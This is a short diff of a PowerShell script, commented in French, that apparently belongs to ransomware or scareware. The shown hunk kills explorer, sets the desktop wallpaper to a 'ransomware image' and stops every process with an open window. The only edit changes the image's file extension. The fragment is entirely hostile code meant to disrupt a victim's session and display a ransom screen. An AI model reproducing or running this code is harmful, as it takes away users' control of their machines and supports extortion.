@@ -51,7 +51,7 @@ Function Set-WallPaper($Image) {
   Get-Process "explorer" | Stop-Process
   
   # Changer fond d'ecran vers image ransomware
-  Set-WallPaper -Image "C:\system32.png"
+  Set-WallPaper -Image "C:\system32.jpg"
   
   #fermer fenetres ouvertes
   Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
